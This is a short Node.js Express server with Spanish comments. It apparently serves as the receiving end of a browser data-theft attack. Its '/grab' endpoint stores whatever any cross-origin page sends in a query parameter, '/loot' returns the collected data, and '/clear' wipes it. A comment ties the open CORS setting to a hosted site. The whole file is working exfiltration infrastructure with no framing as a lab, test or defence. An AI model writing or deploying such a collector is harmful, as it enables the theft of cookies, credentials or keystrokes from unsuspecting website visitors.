/*
░█▀▄░█▀▀░█▀█░█▀▀░█▀█░█▀▄░█▀▀░█▀█░█▀▀░▀█▀░█▀█░█▀▀
░█░█░█▀▀░█▀▀░█▀▀░█░█░█░█░█▀▀░█░█░█░░░░█░░█▀█░▀▀█
░▀▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀
*/

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const escapeHtml = require('escape-html');
const app = express();
const port = 3000;
let texto = "";

/*
░█▀▀░█▀█░█▀█░█▀▀░▀█▀░█▀▀
░█░░░█░█░█░█░█▀▀░░█░░█░█
░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀
*/

app.use(cors());
//allow origin on neocities
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    next();
});
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
/*
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});
*/

/*
░█▀▀░█▀█░█▀▄░█▀█░█▀█░▀█▀░█▀█░▀█▀░█▀▀
░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░░█░░▀▀█
░▀▀▀░▀░▀░▀▀░░▀░░░▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀
*/

app.get('/grab', (req, res) => { // captura los datos enviados por el cliente
    const data = req.query.data;
    if(data){
        texto += escapeHtml(data) + "\n";
        res.send('Datos guardados correctamente.');
    } else {
        res.status(400).send('No se proporcionó ningún dato.');
    }
});

app.get('/loot', (req, res) => { // envía los datos guardados al cliente
    res.send(escapeHtml(texto));
});

app.get('/clear', (req, res) => { // limpia el archivo de salida
    texto = "";
    res.send('Archivo limpiado correctamente.');
});

/*
░█▀▄░█░█░█▀█
░█▀▄░█░█░█░█
░▀░▀░▀▀▀░▀░▀
*/

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
